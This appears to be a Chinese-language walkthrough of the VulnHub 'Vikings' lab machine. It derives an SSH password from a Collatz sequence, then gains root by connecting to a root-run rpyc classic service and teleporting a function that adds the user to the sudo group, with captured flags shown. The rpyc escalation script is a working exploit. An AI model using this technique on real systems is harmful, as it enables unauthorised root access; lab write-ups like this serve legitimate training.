prime-number.collatz-conjecture(num)\n\n可打印的字符是我们要找的对象\nnum是第二九个素数，109\ncollatz猜想：https://zh.wikipedia.org/wiki/%E8%80%83%E6%8B%89%E5%85%B9%E7%8C%9C%E6%83%B3\n\n考拉兹猜想（英语：Collatz conjecture），又称为奇偶归一猜想、3n+1猜想、冰雹猜想、角谷猜想、哈塞猜想、乌拉姆猜想或叙拉古猜想，是指对于每一个正整数，如果它是奇数，则对它乘3再加1，如果它是偶数，则对它除以2，如此循环，最终都能够得到1。\n\n#ascii 0-255可打印\n编写脚本：\ni = 109c = [i]while i!=1:    if(i%2) == 1:        i = i * 3 + 1    else:        i = i//2    if(i&lt;256):        c.append(i)print(c)str = &#x27;&#x27;for n in c:    str = str + chr(n)print(str)\n\nm¤R)|&gt;^/GÖk¡òy¶[Îg¯§ûôz=¸\\.F#j5 P(再筛选出中间可被键盘输出的字符，这里我们可以用cyberchef\n\n\n猜测mR)|&gt;^/Gky[gz=.F#j5P(为Ragnar用户的密码\nssh登录成功\n这里登录的时候会请求ragnar的sudo密码，应该是系统初始的时候执行的命令\n总之先拿到了ragnar的权限\n$ iduid=1001(ragnar) gid=1001(ragnar) groups=1001(ragnar)\n\n升级一下shell到bash\nSHELL=/bin/bash script -q /dev/null\n\n拿到第一个flag\nragnar@vikings:~$ cat user.txt4bf930187d0149a9e4374a4e823f867d\n\n\n\nrpc提权因为登录ragnar用户时，系统会自动sudo，我们可以看下这些预先储存好的命令\n.profile, .bashrc, .bash_profile, /etc/profile, etc. \n当我们检查.profile文件时，我们会发现这一行命令\nsudo python3 /usr/local/bin/rpyc_classic.py\n\n\n\n虽然用户没有权限，但是我们仍然可以看一下有没有rpyc server在跑\n\n计算机网络课中我们学过，rpc是用来实现远程调用的\nrpyc文档：https://rpyc.readthedocs.io/en/latest/index.html\n\nragnar@vikings:~$ netstat -tnlp(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   tcp        0      0 127.0.0.1:18812         0.0.0.0:*               LISTEN      -                   tcp        0      0 127.0.0.1:42945         0.0.0.0:*               LISTEN      -         \n\n既然他打开了服务端口，我们可以本地写一个脚本去连他的服务端，这样在服务端就有可能以root用户执行命令\n（反弹shell失败了，这里更改ragnar用户的权限）\nimport rpycdef getshell():    import os    os.system(&quot;sudo usermod -a -G sudo ragnar&quot;) conn = rpyc.classic.connect(&quot;localhost&quot;)fn = conn.teleport(getshell)fn()\n\n运行脚本后，ragnar已经有了sudo权限，重新用ragnar用户登录靶机，即可提权到root\nroot@vikings:/# cat root/root.txtf0b98d4387ff6da77317e582da98bf31\n\n拿到第二个flag\n","categories":["web"],"tags":["vulnhub"]}]